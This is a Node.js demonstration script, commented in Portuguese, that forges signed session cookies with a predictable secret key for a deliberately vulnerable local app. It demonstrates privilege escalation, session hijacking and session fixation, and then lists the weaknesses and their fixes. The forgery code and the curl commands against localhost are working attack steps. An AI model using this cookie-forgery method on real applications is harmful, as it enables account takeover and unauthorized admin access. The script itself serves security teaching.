#!/usr/bin/env node

/**
 * Demonstra√ß√£o Pr√°tica de Session Cookie Decoding
 * Este script demonstra as vulnerabilidades de session management
 */

const { decodeSessionCookie, createFakeSessionCookie, SECRET_KEY } = require('./session-decoder.js');

console.log('üéØ Demonstra√ß√£o de Vulnerabilidades de Session Cookie\n');

// 1. Criar diferentes tipos de session cookies
console.log('1Ô∏è‚É£ CRIANDO COOKIES DE DEMONSTRA√á√ÉO');
console.log('=====================================\n');

const adminSession = {
    user: {
        id: 1,
        username: 'admin',
        password: 'admin123',
        role: 'admin'
    }
};

const userSession = {
    user: {
        id: 2,
        username: 'user1',
        password: 'password',
        role: 'user'
    }
};

const maliciousSession = {
    user: {
        id: 999,
        username: 'hacker',
        password: 'pwned',
        role: 'admin'
    }
};

// Criar cookies
const adminCookie = createFakeSessionCookie(adminSession, SECRET_KEY);
const userCookie = createFakeSessionCookie(userSession, SECRET_KEY);
const hackCookie = createFakeSessionCookie(maliciousSession, SECRET_KEY);

console.log('Admin Cookie:', adminCookie);
console.log('User Cookie:', userCookie);
console.log('Malicious Cookie:', hackCookie);

// 2. Demonstrar decodifica√ß√£o
console.log('\n2Ô∏è‚É£ DECODIFICANDO COOKIES');
console.log('==========================\n');

const cookies = [
    { name: 'Admin', cookie: adminCookie },
    { name: 'User', cookie: userCookie },
    { name: 'Malicious', cookie: hackCookie }
];

cookies.forEach(({ name, cookie }) => {
    console.log(`--- ${name} Session ---`);
    const decoded = decodeSessionCookie(cookie, SECRET_KEY);
    if (decoded) {
        console.log('‚úÖ Decodificado com sucesso:');
        console.log(JSON.stringify(decoded, null, 2));
    } else {
        console.log('‚ùå Falha na decodifica√ß√£o');
    }
    console.log();
});

// 3. Demonstrar Session Hijacking
console.log('3Ô∏è‚É£ DEMONSTRA√á√ÉO DE SESSION HIJACKING');
console.log('=====================================\n');

console.log('Cen√°rio: Atacante intercepta cookie de admin e cria vers√£o maliciosa\n');

// Simular intercepta√ß√£o
console.log('üîç Cookie interceptado:', adminCookie.substring(0, 50) + '...');

// Modificar dados da sess√£o
const hijackedSession = {
    ...adminSession,
    user: {
        ...adminSession.user,
        username: 'admin_hijacked',
        injected: true,
        backdoor: '/bin/sh'
    }
};

const hijackedCookie = createFakeSessionCookie(hijackedSession, SECRET_KEY);
console.log('üé≠ Cookie modificado criado:', hijackedCookie.substring(0, 50) + '...');

// Decodificar para mostrar modifica√ß√£o
const hijackedData = decodeSessionCookie(hijackedCookie, SECRET_KEY);
console.log('üìã Dados modificados:');
console.log(JSON.stringify(hijackedData, null, 2));

// 4. Demonstrar Session Fixation
console.log('\n4Ô∏è‚É£ DEMONSTRA√á√ÉO DE SESSION FIXATION');
console.log('====================================\n');

// Criar sess√£o pr√©-definida para fixation
const fixedSession = {
    user: {
        id: 1,
        username: 'admin',
        role: 'admin',
        fixed: true,
        timestamp: new Date().toISOString()
    }
};

const fixedCookie = createFakeSessionCookie(fixedSession, SECRET_KEY);
console.log('üîó Cookie fixado criado:', fixedCookie);
console.log('üí° Atacante pode for√ßar a v√≠tima a usar este cookie espec√≠fico');

// 5. An√°lise de Seguran√ßa
console.log('\n5Ô∏è‚É£ AN√ÅLISE DE VULNERABILIDADES');
console.log('===============================\n');

console.log('üö® PROBLEMAS IDENTIFICADOS:');
console.log('- Chave secreta previs√≠vel:', SECRET_KEY);
console.log('- Dados sens√≠veis armazenados no cookie (senhas)');
console.log('- Possibilidade de Session Hijacking');
console.log('- Possibilidade de Session Fixation');
console.log('- Falta de valida√ß√£o de integridade');
console.log('- Cookies n√£o HTTPOnly/Secure');

console.log('\nüõ°Ô∏è MEDIDAS CORRETIVAS:');
console.log('- Usar chave secreta criptograficamente forte');
console.log('- Armazenar apenas ID de sess√£o no cookie');
console.log('- Implementar rota√ß√£o de session ID');
console.log('- Usar flags HTTPOnly e Secure');
console.log('- Implementar timeout de sess√£o');
console.log('- Validar origem das requisi√ß√µes');

console.log('\n6Ô∏è‚É£ COMANDOS PARA TESTE MANUAL');
console.log('==============================\n');

console.log('# Testar cookie admin:');
console.log(`curl -H "Cookie: connect.sid=${adminCookie}" http://localhost:3000/debug`);
console.log();

console.log('# Testar cookie malicioso:');
console.log(`curl -H "Cookie: connect.sid=${hackCookie}" http://localhost:3000/debug`);
console.log();

console.log('# Decodificar manualmente:');
console.log(`node session-decoder.js "${adminCookie}"`);
console.log();

console.log('‚úÖ Demonstra√ß√£o conclu√≠da!');